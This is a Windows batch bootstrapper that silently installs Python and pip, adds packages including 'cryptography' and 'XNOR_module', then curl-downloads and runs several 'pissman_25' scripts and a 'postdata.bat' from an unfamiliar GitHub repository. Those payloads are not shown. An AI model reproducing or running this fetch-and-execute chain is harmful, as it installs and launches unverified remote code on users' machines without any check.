@echo off
setlocal enabledelayedexpansion

set PYTHON_VERSION=3.14.3
set PIP_VERSION=26.0.1

python --version >nul 2>&1
if %errorlevel% neq 0 goto install_python

for /f "tokens=2 delims= " %%v in ('python --version 2^>^&1') do set INSTALLED_PY=%%v

if "%INSTALLED_PY%"=="%PYTHON_VERSION%" (
    goto check_pip
) else (
    goto install_python
)

:install_python
set PYTHON_INSTALLER=python-%PYTHON_VERSION%-amd64.exe
set PYTHON_URL=https://www.python.org/ftp/python/%PYTHON_VERSION%/%PYTHON_INSTALLER%
powershell -Command "Invoke-WebRequest -Uri '%PYTHON_URL%' -OutFile '%PYTHON_INSTALLER%'"
start /wait %PYTHON_INSTALLER% /quiet InstallAllUsers=1 PrependPath=1 Include_pip=1
set "PATH=%PATH%;C:\Program Files\Python%PYTHON_VERSION:~0,3%\;C:\Program Files\Python%PYTHON_VERSION:~0,3%\Scripts\"
goto check_pip

:check_pip
python -m pip --version >nul 2>&1
if %errorlevel% neq 0 goto install_pip

for /f "tokens=2" %%v in ('python -m pip --version') do set INSTALLED_PIP=%%v

if "%INSTALLED_PIP%"=="%PIP_VERSION%" (
    goto python_inst
) else (
    goto install_pip
)

:install_pip
python -m ensurepip
python -m pip install --upgrade pip==%PIP_VERSION%
goto python_inst

:python_inst
call :install_if_missing requests
call :install_if_missing cryptography
call :install_if_missing XNOR_module
if not exist "%~dp0pissman_25_main.py" call :install_file pissman_25_main.py %~dp0 https://raw.githubusercontent.com/BOBZERO-afk/gitfubby-in-here/refs/heads/main/pissman_25_main.py
if not exist "%~dp0pissman_25_GUI.py" call :install_file pissman_25_GUI.py %~dp0 https://raw.githubusercontent.com/BOBZERO-afk/gitfubby-in-here/refs/heads/main/pissman_25_GUI.py
if not exist "%~dp0pissman_25.bat" call :install_file pissman_25.bat %~dp0 https://raw.githubusercontent.com/BOBZERO-afk/gitfubby-in-here/refs/heads/main/pissman_25.bat
if not exist "%~dp0pissman_25.ps1" call :install_file pissman_25.ps1 %~dp0 https://raw.githubusercontent.com/BOBZERO-afk/gitfubby-in-here/refs/heads/main/pissman.ps1
if not exist "%~dp0postdata.bat" call :install_file postdata.bat %~dp0 https://raw.githubusercontent.com/BOBZERO-afk/gitfubby-in-here/refs/heads/main/postdata.bat

python pissman_25_main.py start
goto :eof

:install_if_missing
set "MODULE=%~1"

if "%MODULE%"=="" exit /b

python -c "import %MODULE%" >nul 2>&1
if %errorlevel% neq 0 (
    python -m pip install %MODULE%
)

exit /b

:install_file
set "file=%~1"
set "location=%~2"
set "url=%~3"

cd /d "%location%"
curl -L "%url%" -o "%file%"

exit /b
